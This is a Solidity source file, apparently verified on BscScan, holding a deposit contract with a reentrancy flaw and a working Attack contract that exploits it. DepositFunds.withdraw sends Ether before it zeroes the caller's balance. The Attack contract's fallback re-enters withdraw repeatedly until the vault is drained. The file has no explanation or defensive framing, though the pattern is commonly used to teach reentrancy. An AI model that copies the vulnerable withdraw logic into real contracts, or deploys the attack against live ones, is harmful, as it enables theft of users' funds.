/**
 *Submitted for verification at BscScan.com on 2022-05-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DepositFunds {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
       
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }


}

contract Attack {
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 gwei) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 gwei);
        depositFunds.deposit{value: 1 gwei}();
        depositFunds.withdraw();
    }


}